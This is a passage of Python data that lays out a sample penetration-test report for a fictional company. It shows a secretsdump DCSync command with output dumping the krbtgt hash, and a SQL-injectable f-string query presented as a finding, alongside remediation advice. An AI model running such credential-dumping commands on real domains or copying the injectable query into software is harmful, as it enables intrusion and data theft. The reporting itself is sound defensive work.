        {"time": "5 May 15:02", "title": "Domain Admin", "description": "Pass-the-hash and DCSync on DC01."},
    ]}),
    ("attackmap",),
    ("tool", "commandoutput", {"command": "$ secretsdump.py -hashes :8f3c...c6a8 acme.local/adm_jsmith@10.0.5.10 -just-dc-user krbtgt",
                               "output": "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b7e4d9a6c13f05e8a1d3c7b9f2e6a40:::"}),
    ("tool", "pagebreak", {}),
    ("tool", "sectionheader", {"text": "Findings", "level": 2, "numbered": True, "number": "4"}),
    ("finding", "kerberoast"),
    ("tool", "cvsscard", {"score": 9.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"}),
    ("finding", "vsftpd"),
    ("finding", "sqli"),
    ("tool", "codeblock", {"title": "Vulnerable query (search.py)", "language": "python",
                           "code": "sql = f\"SELECT name, title FROM employee WHERE name ILIKE '%{q}%'\"\ncur.execute(sql)"}),
    ("finding", "tomcat"),
    ("finding", "reuse"),
    ("tool", "evidence", {"imageCaption": "Figure 1: HR-DB query with the reused password",
                          "description": "The portal_app account reads employee_bank_details.",
                          "impact": "Bank details of 1,214 employees exposed."}),
    ("finding", "smb"),
    ("finding", "snmp"),
    ("writeup", "Kerberoasting (sample)"),
    ("tool", "sectionheader", {"text": "Recommendations", "level": 2, "numbered": True, "number": "5"}),
    ("tool", "twocolumn", {"leftTitle": "Now (this week)", "leftContent": "- Reset svc_sql, adm_jsmith, krbtgt (twice)\n- Take FTP-LEGACY offline\n- Patch the directory search",
                           "rightTitle": "Next quarter", "rightContent": "- gMSAs for service accounts\n- AD tiering\n- Secrets vault for app passwords"}),
    ("tool", "numberedlist", {"items": ["Fix the five critical and high findings.", "Retest within 30 days.", "Alert on RC4 Kerberos service tickets."]}),
    ("tool", "checklist", {"title": "Clean-up confirmed", "items": [
        {"text": "WAR removed from ERP-APP01", "checked": True},
        {"text": "xp_cmdshell disabled", "checked": True},
        {"text": "krbtgt reset twice", "checked": False}]}),
    ("tool", "quote", {"text": "We assumed the service accounts were covered by the password policy.", "attribution": "ACME IT, wash-up meeting"}),
    ("tool", "divider", {}),
    ("tool", "bulletlist", {"items": ["Appendix A: host inventory (see the Port Grid export)", "Appendix B: tool output"]}),
    ("tool", "imageplaceholder", {"caption": "Figure 2: network diagram (to be supplied by ACME)", "width": "75%"}),
    ("tool", "spacer", {}),
]
